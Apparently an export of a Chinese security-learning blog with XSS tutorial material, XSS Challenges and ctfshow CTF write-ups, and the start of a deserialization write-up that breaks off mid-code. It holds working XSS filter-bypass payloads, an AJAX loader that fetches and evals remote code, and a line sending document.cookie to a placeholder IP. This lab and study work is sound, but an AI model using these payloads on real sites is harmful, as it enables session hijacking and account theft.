<h2 id="XSS-Downloader"><a href="#XSS-Downloader" class="headerlink" title="XSS Downloader"></a>XSS Downloader</h2><h3 id="XSS下载器"><a href="#XSS下载器" class="headerlink" title="XSS下载器"></a>XSS下载器</h3><p>XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术，取得网页中的XSS代码。<br>在使用XSS Downloader之前我们需要准备一个自己的页面，xss_downloader.php，内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~~~~BOF|alert(/xss/)|EOF~~~~ 		其中~表示前后的代码，BOF和EOF是作为定位使用，中间放置XSS代码</span><br></pre></td></tr></table></figure>
<p>常见的下载器如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">XSS</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		a = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">		a = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">	a.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://172.16.132.138/XSS-TEST/normal/xss_downloader.php&#x27;</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">	a.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">	b=a.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="built_in">eval</span>(<span class="built_in">unescape</span>(b.<span class="title function_">substring</span>(b.<span class="title function_">indexOf</span>(<span class="string">&#x27;BOF|&#x27;</span>)+<span class="number">4</span>,b.<span class="title function_">indexOf</span>(<span class="string">&#x27;EOF|&#x27;</span>))));</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">XSS</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="AJAX-技术的同源策略限制"><a href="#AJAX-技术的同源策略限制" class="headerlink" title="AJAX 技术的同源策略限制"></a>AJAX 技术的同源策略限制</h3><p>AJAX 技术会受到浏览器同源策略的限制，为了解决这个问题，我们需要在服务器端代码中添加如下内容：<br>在XSS Downloader前加上</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Origin:*&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Headers:Origin, X-Requested-With, Content-Type, Accept&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可实现跨域访问</p>
<h2 id="备选存储技术"><a href="#备选存储技术" class="headerlink" title="备选存储技术"></a>备选存储技术</h2><p>可以把Shellcode存储存储在客户端的本地域中，比如HTTP Cookie，Flash共享对象，UserData，localStorage等。这里以HTTP Cookie为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&#x27;utf-8&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;.xss.php&#x27; target=&#x27;_blank&#x27;&gt;Cookie -XSS 验证&lt;/a&gt;&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;设置Cookie失败&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>点击Cookie-XSS验证，即可产生弹窗</p>
<h1 id="靶场训练"><a href="#靶场训练" class="headerlink" title="靶场训练"></a>靶场训练</h1><p>这里使用的是该靶场<a href="http://test.ctf8.com/">XSS Challenges</a><br>简单过一遍~</p>
<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>直接在url处输入</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>按level 1 的方法无法成功，于是观察源代码。发现需要闭合标签。我们需要自己构造：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>尝试使用上一关的注入手法，发现左右尖括号被过滤，于是我们选择不需要尖括号的方式，使用事件闭合单引号：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>和上一关原理相同，只不过换成了双引号：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; onclick=&quot;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>

<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>本关用下划线把on和script分开：o_n, scr_ipt<br>所以我们需要更换标签，使用a标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(/xss/)XSS</span>&lt;/<span class="attr">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>本关也用下划线把href分开：hr_ef<br>我们尝试大小写绕过，发现成功：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>本关输入后，发现href和script都消失了，因此我们判断是进行了一次过滤，那么方案即为双写绕过：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">hrhrefef</span>=<span class="string">&quot;javascrscriptipt:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>本关是添加一个链接，通过源代码可知是将代码写到href里，但写入javascript:alert(&#x2F;xss&#x2F;)后发现script变成了scr ipt，<br>于是我们尝试在script之间加一个TAB键，用编码后的格式插入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascr&amp;#9ipt:alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>无论如何注入，点开源代码，发现都显示链接不合法，那么我们思考是不是检测了http:&#x2F;&#x2F; 于是尝试构造含有http:&#x2F;&#x2F; 的XSS代码，发现成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascr&amp;#9ipt:alert(/xss/)//http://</span><br></pre></td></tr></table></figure>

<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>这一关查看源代码，发现正常显示位置keyword进行了严格过滤，但我们发现源代码中有三个type为hidden的隐藏参数，注入尝试，发现只有t_sort是有效的，因此我们通过t_sort注入XSS代码，把type改为text等能够显示的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>这一关源代码中出现了这样的语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;http://test.ctf8.com/level10.php?keyword=1&amp;t_sort=%22%20type=%22text%22%20onmouseover=%22alert(/xss/)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>t_ref这个值就是http请求中的referer，所以抓包改包<br>如果没有Referer，直接自己添加一个，输入以下值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Referer:&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>只不过是变成了user-agent，XSS注入手法一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-agent:&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>只不过是变成了cookie，XSS注入手法一样，按下F12，点击存储-&gt;Cookie-&gt;user，将值改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; type=&quot;text&quot; onmouseover=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>

<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>exif 题目失效,图片加载不出来<br>漏洞成因：chrome插件exif viewer获取图片exif信息时没有进行过滤，导致xss代码执行。<br>exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，具体实现使用kali下的exiftool工具，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exiftool -FIELD=XSS FILE</span><br><span class="line">exiftool -Artist=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27; brute.jpeg</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于网址失效，从14关之后都无法做了，后面的通关方法可以看看这个博客：<br><a href="http://zhuabapa.top/2019/12/10/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/">XSS挑战之旅</a></p>
<h1 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h1><h2 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h2><p>XSS Filter 的作用是过滤用户(客户端)提交的有害信息，从而达到防范XSS攻击的效果</p>
<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>“永远不要相信用户的输入”是网站开发的基本常识，对于用户输入一定要严格过滤。</p>
<h3 id="输入验证"><a href="#输入验证" class="headerlink" title="输入验证"></a>输入验证</h3><p>简单的说，输入验证就是对用户提交的信息进行有效验证，仅接收指定长度范围内的数据，采用适当格式的内容提交，阻止或忽略除此之外的任何其它数据。</p>
<ul>
<li>输入是否仅包含合法字符</li>
<li>输入字符串是否超过最大长度限制</li>
<li>输入如果含有数字，数字是否在指定范围内</li>
<li>输入是否符合特殊格式要求，如E-mail地址，IP地址等</li>
</ul>
<h3 id="数据消毒"><a href="#数据消毒" class="headerlink" title="数据消毒"></a>数据消毒</h3><p>过滤和净化掉有害输入</p>
<h3 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h3><p>HTML编码主要是用对应的HTML实体代替字符，比如<code>&lt; &gt; &quot; &#39;</code></p>
<h3 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h3><p>不管用输入过滤还是输出编码，都针对数据信息进行黑|白名单式的过滤</p>
<ul>
<li>黑名单：非允许数据</li>
<li>白名单：允许的数据</li>
</ul>
<h2 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM-XSS"></a>DOM-XSS</h2><p>避免客户端文档重写，重定向或其它敏感操作。</p>
<h1 id="XSS工具"><a href="#XSS工具" class="headerlink" title="XSS工具"></a>XSS工具</h1><h2 id="beEF"><a href="#beEF" class="headerlink" title="beEF"></a>beEF</h2><p>XSS 漏洞利用平台<br>启动在kali中<br>工具目录 <code>/usr/share/beef-xss</code><br>配置文件 <code>config.yaml</code><br>修改默认用户名和密码</p>
<h1 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h1><h2 id="浏览器劫持"><a href="#浏览器劫持" class="headerlink" title="浏览器劫持"></a>浏览器劫持</h2><ul>
<li>从软件方面来说，它是一种恶意程序，通过DLL插件、BHO、WinsockLSP等形式对用户的浏览器进行篡改，使用户浏览器出现访问正常网站时被转向到恶意网页、IE浏览器主页&#x2F;搜索页等被修改为劫持软件指定的网站地址等异常情况。</li>
<li>从技术方面来说，它是一种常见的在线攻击类型，黑客可通过这种方式控制的计算机的浏览器，并更改网上冲浪的方式和冲浪时所显示的内容。</li>
<li>“浏览器劫持”，通俗点说就是故意误导浏览器行进路线的一种现象。</li>
</ul>
<h2 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h2><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>会话劫持（Session hijacking），这是一种通过获取用户Session ID后，使用该Session ID登录目标账号的攻击方法，此时攻击者实际上是使用了目标账户的有效Session。会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。</p>
<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><ol>
<li>目标用户需要先登录站点；</li>
<li>登录成功后，该用户会得到站点提供的一个会话标识SessionID；</li>
<li>攻击者通过某种攻击手段捕获Session ID；攻击者获取SessionID的方式有多种：</li>
</ol>
<ul>
<li>暴力破解：尝试各种Session ID，直到破解为止；</li>
<li>预测：如果Session ID使用非随机的方式产生，那么就有可能计算出来；</li>
<li>窃取：使用网络嗅探，XSS攻击等方法获得。</li>
</ul>
<ol start="4">
<li>攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话。</li>
</ol>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ul>
<li>更改Session名称。PHP中Session的默认名称是PHPSESSID，此变量会保存在Cookie中，如果攻击者不分析站点，就不能猜到Session名称，阻挡部分攻击。</li>
<li>关闭透明化Session ID。透明化Session ID指当浏览器中的Http请求没有使用Cookie来存放Session ID时，Session ID则使用URL来传递。</li>
<li>设置HttpOnly。通过设置Cookie的HttpOnly为true，可以防止客户端脚本访问这个Cookie，从而有效的防止XSS攻击。</li>
<li>关闭所有phpinfo类dump request信息的页面。</li>
<li>验证HTTP头部信息。</li>
<li>加入Token校验。同样是用于检测请求的一致性，给攻击者制造一些麻烦，使攻击者即使获取了Session ID，也无法进行破坏，能够减少对系统造成的损失。但Token需要存放在客户端，如果攻击者有办法获取到Session ID，那么也同样可以获取到Token。</li>
</ul>
<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>利用漏洞获取一定的服务器权限就是getshell，如果是web漏洞就叫webshell，还有别的shell，ftp、sql、3899、4899等等，一般来说这个shell权限很低，需要提权后才能获取服务器的管理员权限。<br>ms10002漏洞可以通过winxp的IE浏览器GetShell；</p>
<p>详细内容参考该文：<a href="https://blog.csdn.net/m0_64378913/article/details/124752200">XSS漏洞利用案例</a></p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://zhuanlan.zhihu.com/p/463346634#:~:text=%E4%BB%8E0%E5%88%B01%E5%AD%A6%E4%B9%A0XSS%EF%BC%88%E6%9C%80%E5%85%A8%E6%9C%80%E7%BB%86%E8%87%B4%E7%9A%84%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%EF%BC%89%201%201%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8B%20%28%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96%29%20%EF%BC%881%EF%BC%89%E5%8E%9F%E7%90%86%20%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E5%8F%88%E7%A7%B0%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8Bxss%EF%BC%8C%E6%98%AF%E7%9B%AE%E5%89%8D%E6%9C%80%E6%99%AE%E9%81%8D%E7%9A%84%E7%B1%BB%E5%9E%8B%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%BE%80%E5%BE%80%E5%85%B7%E6%9C%89%E4%B8%80%E6%AC%A1%E6%80%A7%E3%80%82%20%E5%8F%91%E5%87%BA%E8%AF%B7%E6%B1%82%E6%97%B6%EF%BC%8CXSS%E4%BB%A3%E7%A0%81%E5%87%BA%E7%8E%B0%E5%9C%A8URL%E4%B8%AD%EF%BC%8C%E4%BD%9C%E4%B8%BA%E8%BE%93%E5%85%A5%E6%8F%90%E4%BA%A4%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%A7%A3%E6%9E%90%E5%90%8E%E5%93%8D%E5%BA%94%EF%BC%8CXSS%E4%BB%A3%E7%A0%81%E9%9A%8F%E5%93%8D%E5%BA%94%E5%86%85%E5%AE%B9%E4%B8%80%E8%B5%B7%E4%BC%A0%E5%9B%9E%E7%BB%99%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%8C%E6%9C%80%E5%90%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8CXSS%E4%BB%A3%E7%A0%81%E3%80%82%20...,1%E3%80%8B%204%203%E3%80%81%E8%AE%A2%E5%8D%95%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E5%86%9B%E9%94%8B%E7%9C%9F%E4%BA%BACS%E9%87%8E%E6%88%98123%20%EF%BC%881%EF%BC%89%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD%20%E9%93%BE%E6%8E%A5%EF%BC%9A%20pan.baidu.com%2Fs%2F1YUKC5I%20%EF%BC%8C%E6%8F%90%E5%8F%96%E7%A0%81%EF%BC%9Artra%20">从0到1学习XSS</a></p>
]]></content>
      <categories>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-XSS</title>
    <url>/2022/12/29/ctfshow-web%E5%85%A5%E9%97%A8-XSS/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于某些原因，想训练让印象更深刻，就不以拿到flag为目的，选择手写弹窗了。<br>如果想拿flag，需要在相应环境下使用类似于以下的语句：<br><code>&lt;body onload=&quot;window.open(&#39;http://IP/&#39;+document.cookie)&quot;&gt;</code></p>
<span id="more"></span>
<h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>几乎没有任何限制，直接<br><code>&lt;script&gt;alert(0)&lt;/alert&gt;</code><br>或者使用img标签<br><code>&lt;img src=1 onerror=alert(0)&gt;</code><br>或者使用body标签：<br><code>&lt;body onload=&quot;alert(0)&quot;&gt;</code><br>或者使用svg标签：<br><code>&lt;svg onload=&quot;alert(0)&quot;&gt;</code><br>或者使用input标签：<br><code>&lt;input onfocus=&quot;alert(0)&quot; autofocus&gt;</code><br>或者使用video标签：<br><code>&lt;video onloadstart=&quot;alert(0)&quot; src=1 /&gt;</code><br>或者使用style标签：<br><code>&lt;style οnlοad=alert(1)&gt;&lt;/style&gt;</code><br>或者使用iframe标签：<br><code>&lt;iframe onload=&quot;alert(0)&quot;&gt;</code></p>
<h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script标签</p>
<h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><p>增加过滤了a标签和img标签</p>
<h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>增加过滤了style标签</p>
<h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>除了以上的过滤之外，还对video也对空格进行了过滤，使用 <code>/</code> 或 <code>/**/</code> 代替空格绕过即可，比如：<br><code>&lt;iframe/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;input/onfocus=&quot;alert(0)&quot;/autofocus&gt;</code><br><code>&lt;body/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;body/**/onload=&quot;alert(0)&quot;&gt;</code><br><code>&lt;svg/**/onload=&quot;alert(0)&quot;&gt;</code></p>
<h1 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h1><p>同上</p>
<h1 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h1><p>同上</p>
<h1 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h1><p>过滤了iframe标签</p>
<h1 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h1><p>同上</p>
<h1 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h1><p>同上</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，自己有点摸不着头脑，主要是还没学到后面的东西，看来要加强知识的广度啊！</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>XSS</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-web入门-反序列化</title>
    <url>/2022/12/27/ctfshow-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始刷反序列化的题咯~</p>
<span id="more"></span>
<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>查看源码<br>通过GET传入两个参数username和password,检查参数是否为空后，将参数传入login函数中比较与ctfShowUser类里定义的username和password是否相等，如果相等则能显示flag，否则不能。</p>
</li>
<li><p>构造payload<br>本题与反序列化关联不大，就是绕了个圈子作比较罢了。以下是payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    